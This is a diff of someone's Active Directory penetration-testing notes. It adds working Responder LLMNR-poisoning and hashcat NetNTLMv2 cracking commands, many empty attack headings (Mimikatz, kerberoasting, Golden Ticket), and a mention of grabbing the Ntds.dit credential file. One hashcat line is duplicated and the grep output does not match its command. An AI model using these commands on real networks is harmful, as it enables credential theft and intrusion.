@@ -52,8 +52,92 @@ C:\Windows\NTDS\Ntds.dit
 always check for this file and grab it. only accessible through the domian controller and contains everything in Active Directory. 
 
 
-## Pass the hash:
+## LLMNR Poisoning: 
+### Responder:
+gather hashes over the network passively 
+```
+sudo python /usr/share/responder/Responder.py -I eth0 -rdw -v 
+```
+```
+-I interface
+-r enable answers for netbios wredir suffix queries
+-d enable answers for netbios domain suffix queries
+-w start the WPAD rogue proxy server
+-v verbose
+```
+save hashses to file called hashes.txt
+
+### Hashcat:
+using the password file rockyou.txt and the NTLM module to crack passwords
+```
+hashcat -m 5600 hashes.txt rockyou.txt --force
+```
+using the password file rockyou.txt to crack passwords
+```
+hashcat -m 5600 hashes.txt rockyou.txt --force
+```
+
+$ hashcat --help | grep SHA
+
+```
+   5500 | NetNTLMv1                                        | Network Protocols
+   5500 | NetNTLMv1+ESS                                    | Network Protocols
+   5600 | NetNTLMv2                                        | Network Protocols
+   1000 | NTLM                                             | Operating Systems
+   7500 | Kerberos 5 AS-REQ Pre-Auth etype 23              | Network Protocols
+  13100 | Kerberos 5 TGS-REP etype 23                      | Network Protocols
+  18200 | Kerberos 5 AS-REP etype 23                       | Network Protocols
+    100 | SHA1                                             | Raw Hash
+  17400 | SHA3-256                                         | Raw Hash
+  17500 | SHA3-384                                         | Raw Hash
+  17600 | SHA3-512                                         | Raw Hash
+```
+
+
+## LLMNR Poisoning Defense:
+
+
+## SMB attacks: 
+
+
+## IPv6: mitm6
+
+
+## IPv6 Defense:
+
+
+## DNS take over:
+
+
+## Domain Enumeration: 
+# Powerview:
+# Bloodhound: 
+
+
+## Pass the hash: 
+
+
+## CrackMapExec:
+
+
+## SecretsDump.py:
+
+
+## Token Impersonation:
+
+
+## kerberoasting:
+
+
+## GPP:
+
+
+## MimiKatz:
 
 
 ## Golden Ticket: 
+
+
+
+
 
